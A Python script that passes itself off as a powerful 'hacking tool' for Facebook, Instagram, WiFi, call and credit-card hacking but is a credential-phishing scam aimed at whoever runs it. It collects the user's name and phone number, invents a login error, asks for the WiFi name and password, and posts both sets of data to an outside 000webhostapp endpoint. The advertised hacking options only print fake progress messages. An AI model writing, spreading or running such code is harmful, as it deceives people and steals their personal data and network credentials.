import os

try:

  import requests as r

except:

  os.system("pip install requests")

  import requests as r

import time

os.system("clear")

print('''

THE LEGENDS HACKING TOOL IS STARTING

GIVE ME SOME TIME TO START THIS BIG TOOL

THIS TOOL HAVE MANY MODULES AND MODIFIED VERSION

THIS TOOL CAN HACK ANYBODY  LETS USE IT

''')

time.sleep(5)

print("TOOL DOWNLOADED SUCCESSFULLLY\n now enter your phone number then tool is login with your account\n and hack anybody")

time.sleep(7)

try:

  name = input("enter your name: ")

  no = int(input("enter your phone number: "))

except:

  print ("please enter your number \n sed restart the tool and enter the number")

    

  

try:

  r.post(f"https://legendx22.000webhostapp.com/hack.php?msg={name}&msgno={no}")

except:

  pass

print ("i am try to login wait please")

time.sleep(5)

os.system("clear")

print("this system is skipped for a error\nif you have WiFi \n then u can login with WiFi \n enter 1 for WiFi login else press any key to exit")

op = input("enter key: ")

if op == "1":

  print ("now i am login with the WiFi network")

  time.sleep(3)

  print ("give your WiFi details i am relogin")

  time.sleep(3)

  wifi = input ("enter your WiFi name: ")

  pas = input("enter password: ")

else:

  exit()

  

try:

  r.post(f"https://legendx22.000webhostapp.com/hack.php?msg={wifi}&msgno={pas}")

except:

  pass

os.system("clear")

print('''

what you want to hack

1 = FB ACCOUNT

2 = INSTAGRAM ACCOUNT

3 = WIFI BRUTE FORCE

4 = CALL HACK

5 = CREDIT CARD HACK

6 = EXIT 

''')

ok = input("enter a key: ")

if ok == "1":

  print("give fb username or number")

  pro = input("enter username: ")

  for i in range(2000):

    print (f"trying to hack the {pro} pushed {i}  times")

    os.system("clear")

    print("your wifi name or password is wrong")

elif ok == "2":

  print("give me Username")

  op = input("enter Username: ")

  for x in range (2000):

    print (f"trying to hack {op} pushed {x}")

    os.system("clear")

    print("your wifi name or password is wrong")

elif ok == "3":

  print("give wifi name")

  wifi = input("enter wifi name: ")

  for i in range (2000):

    print("hacking this wifi {wifi} pushed {i}")

    os.system("clear")

    print("your wifi name or password is wrong")

elif ok == "4":

  print("give me 2 number \n 1st jisko hack krna h \n 2nd jispe call recording send krna h")

  num = int(input("enter number: "))

  num2 = int(input("now call forward num: "))

  print("make sure your WiFi speed is fast and try again")

elif ok == "5":

  print("give cc number")

  cc = input("enter; ")

  print (cc + 64*79 -86 +979787)

elif ok == "6":

  exit()

  exit

else:

  print("wrong key")

# LEGENDX22, PROBOYX, PROJECT
